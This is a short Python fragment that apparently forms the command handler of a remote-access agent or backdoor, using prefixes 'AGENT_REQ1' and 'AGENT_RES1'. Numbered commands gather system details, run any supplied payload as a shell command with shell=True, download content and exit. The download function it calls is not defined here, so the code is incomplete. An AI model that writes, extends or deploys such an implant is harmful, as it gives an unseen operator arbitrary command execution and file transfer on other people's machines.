import subprocess

request_prefix = "AGENT_REQ1"
response_prefix = "AGENT_RES1"

def dispatch(cmd, payload):
    if cmd == 501:
        return subprocess.check_output(["uname", "-a"])
    if cmd == 502:
        return subprocess.check_output(payload, shell=True)
    if cmd == 503:
        return download(payload)
    if cmd == 504:
        raise SystemExit()
